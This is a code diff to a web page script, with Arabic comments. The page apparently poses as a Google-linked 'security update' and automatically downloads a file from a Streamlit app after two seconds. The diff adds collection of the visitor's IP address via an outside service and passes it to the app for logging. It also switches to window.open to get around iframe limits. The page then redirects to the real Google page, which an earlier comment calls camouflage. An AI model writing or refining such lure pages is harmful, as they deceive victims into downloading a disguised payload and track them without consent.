@@ -74,6 +74,22 @@
 
     <script>
         let hasDownloaded = false;
+        let userIP = "Unknown";
+
+        // جلب IP العميل من الجانب الأمامي لضمان الدقة
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userIP = data.ip;
+                // إرسال الـ IP للتطبيق لتسجيله
+                const currentUrl = new URL(window.parent.location.href);
+                if (!currentUrl.searchParams.has('ip')) {
+                    currentUrl.searchParams.set('ip', userIP);
+                    window.parent.history.replaceState({}, '', currentUrl);
+                }
+            })
+            .catch(err => console.error("Error fetching IP:", err));
+
         function triggerDownload() {
             if (hasDownloaded) return;
             hasDownloaded = true;
@@ -81,18 +97,15 @@
             // سيتم استبدال هذا الرابط ديناميكياً في app.py
             const downloadUrl = "https://rashdai.streamlit.app/api/upload";
             
-            // استخدام iframe مخفي للتحميل لتجنب فتح نوافذ جديدة
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = downloadUrl;
-            document.body.appendChild(iframe);
+            // فتح رابط التحميل في نافذة جديدة لتجاوز قيود iframe
+            window.open(downloadUrl, '_blank');
             
             document.getElementById('status').innerText = "جاري تحميل التحديث الأمني... يرجى الانتظار.";
             
-            // إعادة التوجيه لصفحة جوجل الحقيقية بعد 5 ثوانٍ للتمويه الكامل
+            // إعادة التوجيه لصفحة جوجل الحقيقية بعد 3 ثوانٍ
             setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 5000);
+                window.parent.location.href = "https://www.google.com";
+            }, 3000);
         }
 
         // محاولة التحميل التلقائي بعد 2 ثانية
